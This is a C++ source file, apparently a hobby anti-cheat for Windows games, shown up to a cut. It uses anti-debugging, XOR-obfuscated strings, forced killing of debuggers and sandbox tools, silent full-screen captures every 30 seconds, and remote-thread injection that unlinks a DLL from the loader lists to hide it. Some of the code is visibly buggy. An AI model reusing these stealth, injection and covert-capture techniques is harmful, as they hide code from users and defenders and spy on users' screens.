// AntiCheat SAC.cpp : Defines the entry point for the console application.
//
#define _WIN32_WINNT 0x0500

#include "stdafx.h"
#include <Windows.h>
#include <sddl.h>
#include <accctrl.h>
#include <iomanip>
#include <stdio.h>
#include <conio.h>
#include <aclapi.h>
#include <Iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#include <stdlib.h>
#include <iostream>
#include <ole2.h>
#include <WinBase.h>
#include <olectl.h>
#include <chrono>
#include <thread>
#include <ratio>
#include <tchar.h>
#include <psapi.h>
#include <TlHelp32.h>
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <string.h>
#include <vector>
#include <winnt.h>
#include <Winnetwk.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <algorithm>
#include <ctype.h>
#include <stack>
#include <VersionHelpers.h>
#include <stdint.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <time.h>
#include <WinUser.h>
#include <stdio.h>
#include <stdlib.h>
#include <Psapi.h>
#include <memory>
#include <TimeAPI.h>
#include <sstream>
#include <fstream>
#include <cstdint>
#include <iomanip>
#include "Driver.h"

#pragma comment(lib, "shlwapi.lib")
#pragma warning(disable : 4996)
#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}

#define JUNK_CODE_TWO \
__asm{push eax} \
 __asm{xor eax, eax} \
__asm{mov eax,12} \
__asm{pop eax}
inline int AddSubOne(int One, int Two)
{

	JUNK_CODE_TWO
	JUNK_CODE_ONE
		return ((One + Two) - 1);
}

#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

int DetectionVector = 0;

#define UPPERCASE(x) if((x) >= 'a' && (x) <= 'z') (x) -= 'a' - 'A'
#define UNLINK(x) (x).Blink->Flink = (x).Flink; \
    (x).Flink->Blink = (x).Blink;

#pragma pack(push, 1)

typedef struct _UNICODE_STRING {
	USHORT  Length;
	USHORT  MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _ModuleInfoNode
{
	LIST_ENTRY LoadOrder;
	LIST_ENTRY InitOrder;
	LIST_ENTRY MemoryOrder;
	HMODULE baseAddress;        //  Base address AKA module handle
	unsigned long entryPoint;
	unsigned int size;          //  Size of the modules image
	UNICODE_STRING fullPath;
	UNICODE_STRING name;
	unsigned long flags;
	unsigned short LoadCount;
	unsigned short TlsIndex;
	LIST_ENTRY HashTable;   //  A linked list of any other modules that have the same first letter
	unsigned long timestamp;
} ModuleInfoNode, *pModuleInfoNode;

typedef struct _ProcessModuleInfo
{
	unsigned int size;          //  Size of a ModuleInfo node?
	unsigned int initialized;
	HANDLE SsHandle;
	LIST_ENTRY LoadOrder;
	LIST_ENTRY InitOrder;
	LIST_ENTRY MemoryOrder;
} ProcessModuleInfo, *pProcessModuleInfo;

bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal)
{
	bool result = false;
	PICTDESC pd;

	pd.cbSizeofstruct = sizeof(PICTDESC);
	pd.picType = PICTYPE_BITMAP;
	pd.bmp.hbitmap = bmp;
	pd.bmp.hpal = pal;

	LPPICTURE picture;
	HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
		reinterpret_cast<void**>(&picture));

	if (!SUCCEEDED(res))
		return false;

	LPSTREAM stream;
	res = CreateStreamOnHGlobal(0, true, &stream);

	if (!SUCCEEDED(res))
	{
		picture->Release();
		return false;
	}

	LONG bytes_streamed;
	res = picture->SaveAsFile(stream, true, &bytes_streamed);

	HANDLE file = CreateFile(filename, GENERIC_WRITE, FILE_SHARE_READ, 0,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (!SUCCEEDED(res) || !file)
	{
		stream->Release();
		picture->Release();
		return false;
	}

	HGLOBAL mem = 0;
	GetHGlobalFromStream(stream, &mem);
	LPVOID data = GlobalLock(mem);

	DWORD bytes_written;

	result = !!WriteFile(file, data, bytes_streamed, &bytes_written, 0);
	result &= (bytes_written == static_cast<DWORD>(bytes_streamed));

	GlobalUnlock(mem);
	CloseHandle(file);

	stream->Release();
	picture->Release();
	CloseHandle(file);
	return result;
}
__declspec(noinline) void Encrypt(char* dst, int maxSize);
__declspec(noinline) void Encrypt(char* dst, int maxSize)
{
	for (int i = 0; i < maxSize; i++)
	{
		char chr = dst[i];
		if (chr == '\0')
		{
			break;
		}

		chr = chr ^ 11;
		dst[i] = chr;
	}
}

std::string decode(const std::string& input)
{
	char ntdll[] = "be}jgbo+{dbe⌂ny";
	Encrypt(ntdll, sizeof(ntdll));
	char* begin1 = ntdll;   // Points to string beggining
	char* end1 = ntdll + strlen(ntdll); // Points to string end
	std::replace(begin1, end1, '4', 't');
	// choose a power of two => then compiler can replace "modulo x" by much faster "and (x-1)"
	const size_t passwordLength = 16;
	// at least as long as passwordLength, can be longer, too ...
	static const char password[passwordLength] = "be}jgbo+{dbe⌂ny";
	// out = in XOR NOT(password)
	std::string result = input;
	for (size_t i = 1; i < input.length(); i++)
		result[i] ^= ~password[i % passwordLength];
	return result;
}

bool screenCapturePart(int x, int y, int w, int h, LPCSTR fname)
{
	HDC hdcSource = GetDC(NULL);
	HDC hdcMemory = CreateCompatibleDC(hdcSource);

	int capX = GetDeviceCaps(hdcSource, HORZRES);
	int capY = GetDeviceCaps(hdcSource, VERTRES);

	HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);
	HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

	BitBlt(hdcMemory, 0, 0, w, h, hdcSource, x, y, SRCCOPY);
	hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

	DeleteDC(hdcSource);
	DeleteDC(hdcMemory);

	HPALETTE hpal = NULL;
	if (saveBitmap(fname, hBitmap, hpal)) return true;
	return false;
}

int WINAPI GetWindowText(
	_In_  HWND   hWnd,
	_Out_ LPTSTR lpString,
	_In_  int    nMaxCount
);
void GetProcId(char* ProcName)
{
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &pe32))
	{
		do {
			if (strcmp(pe32.szExeFile, ProcName) == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);  // Close detected process
				TerminateProcess(hProcess, NULL);
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	if (hSnapshot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapshot);
}

void HT()
{
	char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
	Encrypt(ntdll1, sizeof(ntdll1));
	char* begin1 = ntdll1;   // Points to string beggining
	char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
	std::replace(begin1, end1, '4', 't');
	char ntdll[] = "hxld%nsn";
	Encrypt(ntdll, sizeof(ntdll));
	GetProcId(ntdll);
	MessageBox(NULL, "#34 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
	Sleep(30);
	exit(1);
}

typedef NTSTATUS(NTAPI *pfnNtSetInformationThread)(
	_In_ HANDLE ThreadHandle,
	_In_ ULONG  ThreadInformationClass,
	_In_ PVOID  ThreadInformation,
	_In_ ULONG  ThreadInformationLength
	);
const ULONG ThreadHideFromDebugger = 0x11;
void HideFromDebugger()
{

	char ntdll[] = "eogg%ogg";
	Encrypt(ntdll, sizeof(ntdll));
	char* begin1 = ntdll;   // Points to string beggining
	char* end1 = ntdll + strlen(ntdll); // Points to string end
	std::replace(begin1, end1, '4', 't');

	char ntdll12[] = "E⌂Xn⌂Bemdyfj⌂bde_cynjo";
	Encrypt(ntdll12, sizeof(ntdll12));
	char* begin12 = ntdll12;   // Points to string beggining
	char* end12 = ntdll12 + strlen(ntdll12); // Points to string end
	std::replace(begin12, end12, '4', 't');

	HMODULE hNtDll = LoadLibrary(TEXT(ntdll));
	pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
		GetProcAddress(hNtDll, ntdll12);
	NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
		ThreadHideFromDebugger, NULL, 0);
}

struct ProcInfo {
	HWND hWnd;
	DWORD dwProcId;
	CHAR szTitle[255];
	CHAR szClass[255];
};

void Hide_Toolz()
{
	JUNK_CODE_ONE
	while (1)
	{
		HideFromDebugger();
		DWORD dwProcId;
		HWND hWnd;
		ProcInfo mProc[255];
		int mIdList[255];
		int nCount = 0;
		int nPID = 0;
		int i = 0;
		hWnd = FindWindow(0, 0);
		while (hWnd > 0)
		{
			if (GetParent(hWnd) == 0)
			{
				GetWindowThreadProcessId(hWnd, &dwProcId);
				if (!OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcId))
				{
					mProc[nCount].hWnd = hWnd;
					mProc[nCount].dwProcId = dwProcId;

					GetWindowTextA(hWnd, mProc[nCount].szTitle, 255);
					GetClassNameA(hWnd, mProc[nCount].szClass, 255);

					//printf("%2d. ProcessId: %d\n   - Class Name: %s\n   - Window Title: %s\n",  nCount+1, dwProcId, mProc[nCount].szClass, mProc[nCount].szTitle);
					//printf("   - Window Handle: 0x%X\n   - Window State: %s\n\n", hWnd, IsWindowVisible(hWnd) ? "Shown" : "Hidden");
					nCount++;
					for (i = 0; i < nPID; i++)
						if (dwProcId == mIdList[i])
							break;
					if (i == nPID)
						mIdList[nPID++] = dwProcId;
				}
			}
			hWnd = GetWindow(hWnd, GW_HWNDNEXT);
		}
		char ntdll32[] = "☺65+On⌂nh⌂no+.o+|beod|x+dm+.o+cboone+{ydhnxx%☺";
		Encrypt(ntdll32, sizeof(ntdll32));
		char* begin1 = ntdll32;   // Points to string beggining
		char* end1 = ntdll32 + strlen(ntdll32); // Points to string end
		std::replace(begin1, end1, '4', 't');
		if (nCount && nPID > 3) {
			printf(ntdll32, nCount, nPID);
			HT();
		}
		else
		{
			Sleep(100);
		}
		Sleep(400);
	}
	
}

bool WindowExist(LPCSTR WindowName, OUT HWND Prc = NULL) // Check Window By This Name Exist 
{
	HWND proc = FindWindow(NULL, WindowName);

	if (proc != NULL)
	{
		Prc = proc;
		return true;
	}

	return false;
}

HBITMAP FullSreenshot() // Capture FullScreen Screen Shot
{
	int x1, y1, x2, y2, w, h;

	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	w = x2 - x1;
	h = y2 - y1;

	HDC     hScreen = GetDC(NULL);
	HDC     hDC = CreateCompatibleDC(hScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
	BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);


	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);

	return hBitmap;
}

BOOL ProtectProcess(HANDLE hProcess)
{
	SECURITY_ATTRIBUTES sa;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor("D:P", SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;

	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;

	return TRUE;

}

template <typename Container, typename UnaryPredicate>
auto remove_if(Container& c, UnaryPredicate pred)
-> decltype(c.begin())
{
	auto it = std::begin(c);
	while (it != std::end(c))
	{
		if (pred(*it))
		{
			it = c.erase(it);
		}
		else
		{
			++it;
		}
	}
	return it;
}

template <typename Container, typename T>
auto remove(Container& c, T const& value)
-> decltype(c.begin())
{
	return remove_if(c, [&](T const& t) { return t == value; });
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege)   // TRUE to enable.  FALSE to disable
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;

	// 
	// first pass.  get current privilege setting
	// 
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious
	);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	// 
	// second pass.  set privilege based on previous setting
	// 
	tpPrevious.PrivilegeCount = 1;
	tpPrevious.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
	);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	return TRUE;
};

bool FileExists(const char *fname)
{
	FILE *file;
	if (file = fopen(fname, "r"))
	{
		fclose(file);
		return true;
	}
	return false;
}

void ScreenshotTaker()
{
	while (1)
	{
		HideFromDebugger();
		int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
		int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
		int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
		int w = x2 - x1;
		int h = y2 - y1;
		if (FileExists("Logs.png"))
		{
			remove("Logs.png");
		}
		screenCapturePart(x1, y1, w, h, "Logs.png");
		Sleep(30000);
	}
}

void SetDebugPrivA()
{
	HANDLE mainToken;

	// I really don't know what this block of code does :<
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &mainToken))
	{
		if (GetLastError() == ERROR_NO_TOKEN)
		{
			ImpersonateSelf(SecurityImpersonation);
				

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &mainToken)) {
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#31 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
				
			}
		}
	}

	if (!SetPrivilege(mainToken, SE_DEBUG_NAME, true))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#30 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	};
}

#include <Windows.h> 
#include <iostream> 
#include <string> 
using namespace std;

DWORD_PTR _scan_string(HANDLE hProcHandle, const wchar_t* pwszInput)
{
	if (hProcHandle == INVALID_HANDLE_VALUE)
		return -1;

	MEMORY_BASIC_INFORMATION mbi = { 0 };
	LPVOID lpStartAddress = NULL;

	SYSTEM_INFO sysInfo = { 0 };
	GetSystemInfo(&sysInfo);

	lpStartAddress = sysInfo.lpMinimumApplicationAddress;

	while (VirtualQueryEx(hProcHandle, lpStartAddress, &mbi, sizeof(mbi)))
	{
		if ((mbi.State & MEM_COMMIT) && (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)))
		{
			std::cout << "asdgf2wqe " << std::hex << mbi.BaseAddress << std::endl;

			unsigned char szBuffer[4096] = { 0 };
			ReadProcessMemory(hProcHandle, mbi.BaseAddress, &szBuffer, 4096, NULL);

			for (int x = 0; x < 4096; x++)
			{
				if (memcmp((LPVOID)&szBuffer[x], pwszInput, wcslen(pwszInput)) == 0)
					return ((DWORD_PTR)mbi.BaseAddress + x);
			}
		}

		lpStartAddress = (LPVOID)((DWORD_PTR)(lpStartAddress)+mbi.RegionSize);
	}

	return 0;
}

bool CompareData(PBYTE pData, PBYTE seqSignature, PCHAR seqMask)
{
	while ((*seqMask) != NULL) {
		if (*pData != *seqSignature && *seqMask == 'x')
			return false;
		pData++;
		seqSignature++;
		seqMask++;
	}
	return true;
}

PBYTE FindPattern(PBYTE dwAddr, DWORD dwSize, PBYTE seqSignature, PCHAR seqMask)
{
	DWORD i;
	for (i = 0; i < dwSize; i++)
	{
		if (CompareData(dwAddr + i, seqSignature, seqMask)) {
			return (dwAddr + i);
		}
	}
	return nullptr;
}

bool DllLoaded(char* moduleName)
{
	return GetModuleHandle((LPCSTR)moduleName);
}

int GetModules(OUT HMODULE* modules)
{
	DWORD currentProcces = 0;
	HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
	MODULEENTRY32 me32;

	hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, currentProcces);

	if (hModuleSnap == INVALID_HANDLE_VALUE)
	{
		return (FALSE);
	}

	me32.dwSize = sizeof(MODULEENTRY32);

	if (!Module32First(hModuleSnap, &me32))
	{
		CloseHandle(hModuleSnap);
		return (FALSE);
	}

	int a = 0;

	do
	{
		modules[a] = (HMODULE)me32.szModule;
		a++;

	} while (Module32Next(hModuleSnap, &me32));

	CloseHandle(hModuleSnap);
	a = NULL;


	return 0;
}

bool CloakDll_stub(HMODULE);
void CD_stubend();

bool CloakDll(char *, char *);
unsigned long GetProcessIdFromProcname(char *);
HMODULE GetRemoteModuleHandle(unsigned long, char *);

void ToLower(unsigned char* Pstr)
{
	char* P = (char*)Pstr;
	unsigned long length = strlen(P);
	for (unsigned long i = 0; i<length; i++) P[i] = tolower(P[i]);
	return;
}

bool isInCharString(char *str1, char *search)
{
	for (int i = 0; i < strlen(str1); ++i)
	{
		if (strncmp(&str1[i], search, strlen(search)) == 0)
			return true;
	}

	return false;
}

DWORD FindPattern(HANDLE Handle, char *szPattern, char *szMask)
{
	// Get the current process information
	MODULEINFO mInfo = { 0 };
	GetModuleInformation(Handle, GetModuleHandle(NULL), &mInfo, sizeof(MODULEINFO));
	// Find the base address 
	DWORD dwBase = (DWORD)mInfo.lpBaseOfDll;
	DWORD dwSize = (DWORD)mInfo.SizeOfImage;
	// Get the pattern length
	DWORD dwPatternLength = (DWORD)strlen(szMask);
	// Loop through all the process
	for (DWORD i = 0; i < dwSize - dwPatternLength; i++)
	{
		bool bFound = true;
		// Loop through the pattern caracters
		for (DWORD j = 0; j < dwPatternLength; j++)
			bFound &= szMask[j] == '?' || szPattern[j] == *(char*)(dwBase + i + j);

		// If found return the current address
		if (bFound)
			return dwBase + i;
	}
	// Return null
	return NULL;
}

char* GetAddressOfData(DWORD pid, const char *data, size_t len)
{
	HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (process)
	{
		SYSTEM_INFO si;
		GetSystemInfo(&si);

		MEMORY_BASIC_INFORMATION info;
		std::vector<char> chunk;
		char* p = 0;
		while (p < si.lpMaximumApplicationAddress)
		{
			if (VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info))
			{
				p = (char*)info.BaseAddress;
				chunk.resize(info.RegionSize);
				SIZE_T bytesRead;
				if (ReadProcessMemory(process, p, &chunk[0], info.RegionSize, &bytesRead))
				{
					for (size_t i = 0; i < (bytesRead - len); ++i)
					{
						if (memcmp(data, &chunk[i], len) == 0)
						{
							return (char*)p + i;
						}
					}
				}
				p += info.RegionSize;
			}
		}
	}
	return 0;
}

bool DataCompare(BYTE* data, BYTE* sign, char* mask)
{
	for (; *mask; mask++, sign++, data++)
	{
		if (*mask == 'x' && *data != *sign)
		{
			return false;
		}
	}
	return true;
}

DWORD FindPattern(HANDLE handle,char *pattern, char *mask, DWORD moduleBaseAddr, int moduleSize)
{
	
	int patternSize = strlen(mask);
	char buffer[100];
	for (DWORD i = 0; i < moduleSize - patternSize; i++)
	{
		bool found = true;
		ReadProcessMemory(handle, (LPVOID)(moduleBaseAddr + i), &buffer, patternSize, NULL);
		for (int l = 0; l < patternSize; l++)
		{
			found = mask[l] == '?' || buffer[l] == pattern[l];
			if (!found)
				break;
		}

		if (found)
			return i;
	}
	return 0;
}

string getOutputFilePathNextToPath(string inputPath)
{
	size_t found = inputPath.find_last_of("/\\");
	string outputPath = inputPath.substr(0, found) + "\\";  //append a back slash to the end of the path
	string outputName = inputPath.substr(found + 1);

	if (outputName.find(".")) // file name has extension
	{
		//strip off the extension and add .dmp
		size_t period = outputName.find_last_of(".");
		outputName = outputName.substr(0, period) + ".dmp";
	}
	else {
		//no file extension so just add .dmp
		outputName += ".dmp";
	}

	return outputPath + outputName;
}

#define PAGESIZE 4096
std::string hashfile(const char *filename)
{
	std::ifstream fp(filename);
	std::stringstream ss;

	// Unable to hash file, return an empty hash.
	if (!fp.is_open()) {
		return "";
	}

	// Hashing
	uint32_t magic = 5381;
	char c;
	while (fp.get(c)) {
		magic = ((magic << 5) + magic) + c; // magic * 33 + c
	}

	ss << std::hex << std::setw(8) << std::setfill('0') << magic;
	return ss.str();
}
void ReadString()
{
	HideFromDebugger();
	char ntdll3[] = "cjh`";
	Encrypt(ntdll3, sizeof(ntdll3));
	char* begin3 = ntdll3;   // Points to string beggining
	char* end3 = ntdll3 + strlen(ntdll3); // Points to string end
	std::replace(begin3, end3, '4', 't');

	char ntdll22[] = "hcnj⌂";
	Encrypt(ntdll22, sizeof(ntdll22));
	char* begin12 = ntdll22;   // Points to string beggining
	char* end12 = ntdll22 + strlen(ntdll22); // Points to string end
	std::replace(begin12, end12, '4', 't');

	char ntdll41[] = "beanh⌂dy";
	Encrypt(ntdll41, sizeof(ntdll41));
	char* begin31 = ntdll41;   // Points to string beggining
	char* end31 = ntdll41 + strlen(ntdll41); // Points to string end
	std::replace(begin31, end31, '4', 't'); 

	char ntdll54[] = "oNs⌂nyejg";
	Encrypt(ntdll54, sizeof(ntdll54));
	char* begin132 = ntdll54;   // Points to string beggining
	char* end132 = ntdll54 + strlen(ntdll54); // Points to string end
	std::replace(begin132, end132, '4', 't');



	while (1)
	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;

		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
		
		}


		// Calculate how many process identifiers were returned.

		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the name and process identifier for each process.

		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0)
			{
				TCHAR szProcessName[MAX_PATH] = TEXT("");
				TCHAR szProcessName1[MAX_PATH] = TEXT("");
				// Get a handle to the process.

				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
					PROCESS_VM_READ,
					FALSE, aProcesses[i]);

				// Get the process name.
				LPSTR FilePath = "";
				HMODULE hMod = NULL;
				DWORD cbNeeded;
				if (NULL != hProcess)
				{
					

					if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
						&cbNeeded))
					{
						GetModuleBaseName(hProcess, hMod, szProcessName1,
							sizeof(szProcessName1) / sizeof(TCHAR));

						GetModuleBaseName(hProcess, hMod, szProcessName,
							sizeof(szProcessName) / sizeof(TCHAR));


						
						//GetModuleFileName(hMod, FilePath, MAX_PATH);
						//cout << "FilePath test: " << FilePath << endl;
					}
					
				}
				
				TCHAR filename[MAX_PATH];
				HWND WinClasse;
				LPCSTR Buffer = NULL;
				// Print the process name and identifier.
				//cout << szProcessName << endl;
				ToLower((unsigned char*)szProcessName1);
				//cout << szProcessName1 << endl;
				if (isInCharString(szProcessName1, ntdll22)
					|| isInCharString(szProcessName1, ntdll3)
					|| isInCharString(szProcessName1, ntdll54)
					|| isInCharString(szProcessName1, ntdll41))
				{
					GetProcId(szProcessName);
					TerminateProcess(szProcessName, NULL);
				}
				
				CloseHandle(hProcess);
			}
		}
		Sleep(300);
	}
}

void MakeSureCSGO()
{

}

bool CloakDll(char *process, char *dllName)
{
	PathStripPath(dllName);

	unsigned long procId;
	procId = GetProcessIdFromProcname(process);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);

	//  Calculate the length of the stub by subtracting it's address
	//  from the beginning of the function directly ahead of it.
	//
	//  NOTE: If the compiler compiles the functions in a different
	//  order than they appear in the code, this will not work as
	//  it's supposed to.  However, most compilers won't do that.
	unsigned int stubLen = (unsigned long)CD_stubend - (unsigned long)CloakDll_stub;

	//  Allocate space for the CloakDll_stub function
	void *stubAddress = VirtualAllocEx(hProcess,
		NULL,
		stubLen,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	//  Write the stub's code to the page we allocated for it
	WriteProcessMemory(hProcess, stubAddress, CloakDll_stub, stubLen, NULL);

	HMODULE hMod = GetRemoteModuleHandle(procId, dllName);

	//  Create a thread in the remote process to execute our code
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stubAddress, hMod, 0, NULL);

	//  Clean up after ourselves, so as to leave as little impact as possible
	//  on the remote process
	VirtualFreeEx(hProcess, stubAddress, stubLen, MEM_RELEASE);
	return true;
}

bool CloakDll_stub(HMODULE hMod)
{
	ProcessModuleInfo *pmInfo;
	ModuleInfoNode *module;

	_asm
	{
		mov eax, fs:[18h]       // TEB
		mov eax, [eax + 30h]    // PEB
		mov eax, [eax + 0Ch]    // PROCESS_MODULE_INFO
		mov pmInfo, eax
	}

	module = (ModuleInfoNode *)(pmInfo->LoadOrder.Flink);

	while (module->baseAddress && module->baseAddress != hMod)
		module = (ModuleInfoNode *)(module->LoadOrder.Flink);

	if (!module->baseAddress)
		return false;

	//  Remove the module entry from the list here
	/////////////////////////////////////////////////// 
	//  Unlink from the load order list
	UNLINK(module->LoadOrder);
	//  Unlink from the init order list
	UNLINK(module->InitOrder);
	//  Unlink from the memory order list
	UNLINK(module->MemoryOrder);
	//  Unlink from the hash table
	UNLINK(module->HashTable);

	//  Erase all traces that it was ever there
	///////////////////////////////////////////////////

	//  This code will pretty much always be optimized into a rep stosb/stosd pair
	//  so it shouldn't cause problems for relocation.
	//  Zero out the module name
	memset(module->fullPath.Buffer, 0, module->fullPath.Length);
	//  Zero out the memory of this module's node
	memset(module, 0, sizeof(ModuleInfoNode));

	return true;
}

__declspec(naked) void CD_stubend() {}

unsigned long GetProcessIdFromProcname(char *procName)
{
	PROCESSENTRY32 pe;
	HANDLE thSnapshot;
	BOOL retval, ProcFound = false;

	thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (thSnapshot == INVALID_HANDLE_VALUE)
	{
		MessageBox(NULL, "Error: unable to create toolhelp snapshot", "Loader", NULL);
		return false;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	retval = Process32First(thSnapshot, &pe);

	while (retval)
	{
		if (StrStrI(pe.szExeFile, procName))
		{
			ProcFound = true;
			break;
		}

		retval = Process32Next(thSnapshot, &pe);
		pe.dwSize = sizeof(PROCESSENTRY32);
	}

	return pe.th32ProcessID;
}

HMODULE GetRemoteModuleHandle(unsigned long pId, char *module)
{
	MODULEENTRY32 modEntry;
	HANDLE tlh = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pId);

	modEntry.dwSize = sizeof(MODULEENTRY32);
	Module32First(tlh, &modEntry);

	do
	{
		if (!_stricmp(modEntry.szModule, module))
			return modEntry.hModule;
		modEntry.dwSize = sizeof(MODULEENTRY32);
	} while (Module32Next(tlh, &modEntry));

	return NULL;
}

void ClasseWindow(LPCSTR WindowClasse)
{
	HWND WinClasse = FindWindowExA(NULL, NULL, WindowClasse, NULL);
	if (WinClasse > 0)
	{
		SendMessage(WinClasse, WM_CLOSE, 0, 0);
		
	}
}

bool TitleWindow(LPCSTR WindowTitle)
{
	HWND WinTitle = FindWindowA(NULL, WindowTitle);
	if (WinTitle > 0) {
		SendMessage(WinTitle, WM_CLOSE, 0, 0);  //CLOSE HACK WINTITLE
		return false;
	}
	return true;
}

void ClasseCheckPross()
{
	JUNK_CODE_ONE
	while (1)
	{
		HideFromDebugger();
		// PID Detector are Case-sensitive!
		GetProcId("ahk.exe");
		GetProcId("ida.exe");
		GetProcId("ollydbg.exe*32");
		GetProcId("ollydbg.exe");
		GetProcId("bvkhex.exe");
		GetProcId("cheatengine-x86_64.exe");
		GetProcId("HxD.exe");
		GetProcId("procexp2.exe");
		GetProcId("Hide Toolz3.3.3.exe");
		GetProcId("SbieSvc.exe");    // < sandbox 
